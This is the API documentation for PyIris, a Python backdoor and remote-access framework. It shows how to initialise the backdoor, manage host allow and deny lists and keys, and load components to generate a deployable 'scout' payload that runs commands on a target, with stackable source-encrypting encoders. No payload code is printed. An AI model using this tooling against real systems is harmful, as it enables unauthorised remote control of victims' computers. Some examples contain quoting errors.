# The PyIris Project - API
This is a version of PyIris packaged into an API. To access the implementation of this api, visit \<pyiris-api-implementation\>
For more information about PyIris as a whole, visit its official github page: \<pyiris\>

# Installation
```
pip install pyiris-api
```

# Official Documentation & Usage Guide
## Basic Usage:
For a basic instance,
```py
from pyiris_api import PyIris

p = PyIris.Main() #Initialise an instance of the backdoor.
```

For verbose command output,
```py
from pyiris_api import PyIris

p = PyIris.Main(verbose=True) #Initialise an instance of the backdoor.
```

Use your own logging instead of the default print statements (To learn about logging_handlers: \<custom_logging_handlers\>),
```py
from pyiris_api import PyIris
import my_logging_handler

p = PyIris.Main(logging_handler=my_logging_handler.Main, verbose=True) #Initialise an instance of the backdoor.
```

## Config Variables:
Config variables in PyIris are the global variables initialised when the backdoor is initialised. Their default values are stored in pyiris_api/library/modules/config.py. Access them like so,
```py
from pyiris_api import PyIris

p = PyIris.Main()
p.config.myGlobalVar = "myGlobalVar"
print(p.config.myGlobalVar) # myGlobalVar
```

To initialise a config variable at startup, simply specify it in the parameters of the PyIris object like so,
Note: In the case you are defining a log_handler, include it as a parameter before defining any config variables
```py
from pyiris_api import PyIris

p = PyIris.Main(myGlobalVar="myGlobalVar")
```

#### IMPORTANT NOTE:
Any command run by the PyIris object will have an output with a format as follows:
```py
{"status": "ok", "message": "This is a message", "data": None}
```
- `"status"` is a string which can have values `"ok"`, `"error"`, `"warning"`. It is used to check the status of the command.
- `"message"` is a string which will have a small description of the command output
- `"data"` will either be `None` or a dictionary containing useful command output.
## Home Commands:
These are the home commands of PyIris. Use these commands to manipulate the host whitelist, host blacklist and PyIris key.
Common Terms:
- Host Whitelist: 
- Host Blacklist:
- Key: This is a random key generated at startup and located in resources/PyIris.cred from wherever you run the api. It is used to verify scouts and prevent connections from any scouts which do not possess the key

#### `add_to_list(list_type, hostname)`
Adds a host to a list
```py
print(p.config.white_list) # []
output = p.home.add_to_list("whitelist", "192.168.1.7")
print(output) # {"status": "ok", "message": "Added 192.168.1.7 to whitelist", "data": {"whitelist": ["192.168.1.7"]}}
```

#### `reset_list(list_type)`
Resets a list
```py
print(p.config.white_list) # []
p.home.add_to_list("whitelist", "192.168.1.7")
print(p.config.white_list) # ["192.168.1.7"]
output = p.home.reset_list("whitelist")
print(output) # {"status": "ok", "message": "Reset Whitelist", "data": {"whitelist": []}}
```

#### `remove_list(list_type, hostname)`
Remove a host from a list
```py
print(p.config.white_list) # []
p.home.add_to_list("whitelist", "192.168.1.7")
p.home.add_to_list("whitelist", "192.168.1.8")
print(p.config.white_list) # ["192.168.1.7", "192.168.1.8"]
output = p.home.remove_list("whitelist", "192.168.1.7")
print(output) # {"status": "ok", "message": "Removed 192.168.1.7 from Whitelist", "data": {"whitelist": ["192.168.1.8"]}}
```

#### `set_list(list_type, to_set)`
Sets the value of a list. `to_set` must be a list.
```py
print(p.config.white_list) # []
output = p.home.set_list("whitelist", ["192.168.1.7, "192.168.1.8"])
print(output) # {"status": "ok", "message": "Set whitelist to ['192.168.1.7', '192.168.1.8']", "data": {"whitelist": ["192.168.1.7", "192.168.1.8"]}}
```

#### `regen_key(key=None)`
Randomly generates a key if `key` is `None`. Otherwise, sets the key to the value of `key`.
```py
output = p.home.regen_key()
print(output) # {"status": "ok", "message": "Successfully wrote new key", "data": {"key": "*********"}}
output = p.home.regen_key(key="thisIsAKey123321")
print(output) # {"status": "ok", "message": "Successfully wrote new key", "data": {"key": "thisIsAKey123321""}}
```

#### `show(list_type)`
`list_type` can be `"key"`, `"whitelist"`, "`blacklist`", `"all"`. It is used to display any of these parameters.
`"all"` will display the values of both the lists
```py
output = p.home.show("key")
print(output) # {"status": "ok", "message": "", "data": {"key": "*********"}}
output = p.home.show("whitelist")
print(output) # {"status": "ok", "message": "", "data": {"whitelist": []}}
```

## Generator Commands
These are the generator commands of PyIris which let you dynamically load modules and generate a deployable payload. It allows you to dynamically add and remove functionality to the deployable scout while supporting source code encryption and code compilation.
Common Terms:

- Scout: This is the deployable program which will connect to PyIris and execute commands on the target computer
- Components: These are loadable modules which give functionality to the deployable scout. They are referenced by their Ids
- Base: These are code bases upon which components are loaded. They essentially control the mode of connection and communication between PyIris and the payload.
- Encoders: These are programs which encrypt the scout's source code. They can be stacked
Note: Shortcuts exist when loading modules by their IDs in bulk. This is a guide to format `component_str` and `encoder_str`. To load multiple components use "-" between the ID ranges of the components to load them. To load separate ID elements use "," to denote separate elements. Ranges can also be nested as elements. When loading components the final ID's will be formatted in order and stripped of duplicates, when loading encoders ID's of encoders remain in the order they originally were in duplicates remain since encoders can be stacked.
#### `load_component(component_str)`
This command loads components which will eventually be loaded onto the deployable scout
```py
output = p.generate.load_component("3-7")
```
